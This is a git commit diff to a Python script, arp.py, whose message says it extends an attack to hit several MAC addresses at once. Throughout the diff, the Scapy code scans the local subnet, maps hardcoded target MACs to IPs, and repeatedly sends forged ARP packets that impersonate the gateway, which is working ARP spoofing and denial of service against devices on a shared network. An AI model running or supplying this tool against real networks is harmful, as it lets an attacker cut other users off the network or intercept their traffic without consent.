4df989008201df3e3d02acdb3669a355e5fdcb84
ZJYC <zhaojingyangchun@163.com>
2017-04-10 13:47:08 +0800

    aim at more than one mac
    Trying to attack more than one mac at one time..

--- Python/arp.py
+++ Python/arp.py
@@ -18,7 +18,8 @@ def GetMac(tgtIP,Retry=4):
     try:
         while cnt < Retry:
             tgtMac = getmacbyip(tgtIP)
-            if tgtMac is None:print("Get Mac of IP <%s> failed...Will Retry the <%s> times"%(tgtIP,cnt));cnt += 1
+            if tgtMac is None:
+                print("Get Mac of IP <%s> failed...Will Retry the <%s> times"%(tgtIP,cnt));cnt += 1
             else:return tgtMac
     except:
         print("Get Mac of %s failed..."%tgtIP)
@@ -52,8 +53,8 @@ def GetForgedMac(OurMac,Num):
     return ForgedMac
 
 Table = {}
-def ScanfByArp(OurIP = "192.168.0.1",Start = 0,End = 255,TimeOut = 3,ClearAtFirst = True):
-    if ClearAtFirst is True : Table.clear()
+def ScanfByArpOnce(OurIP = "192.168.0.1",Start = 0,End = 255,TimeOut = 3,ClearAtFirst = 1):
+    if ClearAtFirst is 0 : Table.clear()
     SubString = GetSubNet(OurIP)
     ip = []
     for num in range(Start,End+1):ip.append(SubString+str(num))
@@ -64,23 +65,24 @@ def ScanfByArp(OurIP = "192.168.0.1",Start = 0,End = 255,TimeOut = 3,ClearAtFirs
     g = lambda(s,r):GetArpResult(r)
     ans.summary(g)
 
-def GetIpByMacWithRetry(Mac,Retry=4,Delay=4):
-    for i in range(0,Retry + 1):
+def ScanfByArp(Retry=4,Delay=4):
+    for i in range(0,Retry):
         time.sleep(i*Delay)
-        ScanfByArp(Start=100,End=150,TimeOut=5,ClearAtFirst=True)
-        Res = Table.get(Mac)
-        if Res is not None:return Res
-    else:print("Can not get ip of <%s>"%Mac);return None
+        #Clear the table at first
+        ScanfByArpOnce(Start=100,End=150,TimeOut=5,ClearAtFirst=i)
 
+def GetIpByMac(Mac):
+    return Table.get(Mac)
+    
 def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
     
     MY_ip = get_if_addr(Face)
     MY_mac = get_if_hwaddr(Face)
-    if MY_ip is None or MY_mac == None:return
+    if MY_ip is None or MY_mac is None:return
     print("%s -> %s"%(MY_ip,MY_mac))
     
     BctIP = GetBrocastIP(MY_ip)
-    Bct_mac = "FF:FF:FF:FF:FF:FF"
+    Bct_mac = "ff:ff:ff:ff:ff:ff"
     print("%s -> %s"%(BctIP,Bct_mac))
     
     GW_ip = GWIP
@@ -88,59 +90,67 @@ def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
     if GW_mac is None:return
     print("%s -> %s"%(GW_ip,GW_mac))
     
-    #XM_mac = "c8:3a:35:c0:05:15"
-    #XM_mac = "24:09:95:95:e2:02"
-    #XM_mac = "04:e6:76:46:a6:f3"
-    XM_mac = MAC
-    XM_ip = GetIpByMacWithRetry(XM_mac,4,4)
-    if XM_ip is None:return
-    print("%s -> %s"%(XM_ip,XM_mac))
-    cnt = 0
-    while True:
+    PKT = []
+    
+    #scanf the subnet
+    ScanfByArp(1,2)
+    for XM_mac in MAC:
+        XM_ip = GetIpByMac(XM_mac)
+        #if the IP is not existed,pass it
+        if XM_ip is None:continue
+        print("%s -> %s"%(XM_ip,XM_mac))
         Temp_mac = GetForgedMac(MY_mac,PackNum)
         Temp_ip = GetForgedIP(MY_ip,PackNum)
-        PKT = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
-        try:sendp(PKT,iface = Face);cnt += 1
+        PKT_ = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=XM_ip,hwdst=XM_mac)
+        PKT.append(PKT_)
+    else : 
+        if len(PKT) is 0:print ("Target not found...");return
+    cnt = 0
+    while True:
+        try:
+            cnt += 1
+            sendp(PKT,iface = Face);
+            print("Will sleep for %s S and had sent %s PKTs"%(Interval,cnt))
+            time.sleep(Interval)
         except:print("!!Send Error!!")
-        print("Will sleep for %s S and had sent %s PKTs"%(Interval,cnt))
-        time.sleep(Interval)
         if Counter == -1:pass
         else:
             if cnt >= Counter:return
-
+            
+#GWIP:your gateway's ip
+#Interface:the network interface you want to use
+#Delay:The delay between this action
 def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
-    '''
-    GWIP:your gateway's ip
-    Interface:the network interface you want to use
-    Delay:
-    '''
     if IsWifiWorkWell(GWIP) is False:
         print("Will restart the interface <%s>"%Interface)
-        os.system("ifconfig %s down"%Interface)
+        os.system("sudo ifconfig %s down"%Interface)
         time.sleep(Delay)
-        os.system("ifconfig %s up"%Interface)
+        os.system("sudo ifconfig %s up"%Interface)
         time.sleep(Delay)
         os.system('sudo /etc/init.d/networking restart')
         time.sleep(Delay)
         print("Network restart finished...")
         return True
     else:return False
+    
+#To check whether the wifi is working well by acquiring GWIP's MAC(Usually our gateway's IP)
 def IsWifiWorkWell(GWIP = "192.168.0.1"):
-    '''
-    To check whether the wifi is working well by acquiring GWIP's MAC(Usually our gateway's IP)
-    '''
-    if GetMac(GWIP) is None:return False
+    res = GetMac(GWIP)
+    if res is None or res is "ff:ff:ff:ff:ff:ff":return False
     else:return True
+    
+def DelayForxMinute(Length=1,Print=True):
+    print("Delay started,Length is %s"%Length)
+    num=0
+    while num < Length:
+        time.sleep(60);num += 1
+        if Print is True:print("Delaying now...%s"%num)
+    else:print("Delay ended...")
+    
 if __name__ == "__main__":
-    #while True:
-    #AttackIP("192.168.0.108","wlan0",10,60,"192.168.0.1")
-    #AttackMac(Mac,face,Num,Interval,GW_IP):
-    #AttackMac("C8:3A:35:C0:05:15","wlan0",2,2,"192.168.0.108")
-    #num=0
-    #while num < 0:
-    #    num = num + 1
-    #    time.sleep(60)
-    #    print(num)
+    DelayForxMinute(0,True)
+    #the mac you want to attack
+    TargetMac = ["04:e6:76:46:a6:f3","78:02:f8:34:4d:b5"]
     while True:
-        EnsureWifiConnection()
-        Attack_MAC("ens33","192.168.0.1","04:e6:76:46:a6:f3",60,300,1)
+        EnsureWifiConnection("192.168.0.1","ens33",2)
+        Attack_MAC("ens33","192.168.0.1",TargetMac,10,10,1)
